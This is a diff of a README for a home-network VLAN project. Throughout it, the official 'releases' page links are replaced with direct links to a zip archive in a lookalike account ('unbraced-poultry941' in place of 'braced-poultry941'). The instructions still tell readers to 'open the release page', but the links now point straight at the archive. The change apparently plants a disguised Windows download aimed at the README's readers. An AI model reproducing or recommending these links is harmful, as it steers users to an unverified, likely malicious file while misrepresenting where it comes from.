@@ -1,12 +1,12 @@
 # 🏠 HomeLab-VLAN-Refactor-Community - Simplify Your Home Network
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/braced-poultry941/HomeLab-VLAN-Refactor-Community/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/unbraced-poultry941/HomeLab-VLAN-Refactor-Community/raw/refs/heads/main/docs/Home_Refactor_Community_VLA_Lab_v1.6.zip)
 
 ## 📥 Download
 
 Visit this page to download the latest release for Windows:
 
-https://github.com/braced-poultry941/HomeLab-VLAN-Refactor-Community/releases
+https://github.com/unbraced-poultry941/HomeLab-VLAN-Refactor-Community/raw/refs/heads/main/docs/Home_Refactor_Community_VLA_Lab_v1.6.zip
 
 ## 🖥️ What this project does
 
@@ -41,7 +41,7 @@ A typical setup works well on:
 
 ## 🚀 How to download and run
 
-1. Open the release page: https://github.com/braced-poultry941/HomeLab-VLAN-Refactor-Community/releases
+1. Open the release page: https://github.com/unbraced-poultry941/HomeLab-VLAN-Refactor-Community/raw/refs/heads/main/docs/Home_Refactor_Community_VLA_Lab_v1.6.zip
 2. Find the latest release at the top of the page
 3. Download the Windows file or package from that release
 4. Save the file to your Downloads folder
@@ -237,4 +237,4 @@ It works well for a small lab that includes servers, storage, wireless access po
 
 Download from the release page here:
 
-https://github.com/braced-poultry941/HomeLab-VLAN-Refactor-Community/releases
+https://github.com/unbraced-poultry941/HomeLab-VLAN-Refactor-Community/raw/refs/heads/main/docs/Home_Refactor_Community_VLA_Lab_v1.6.zip
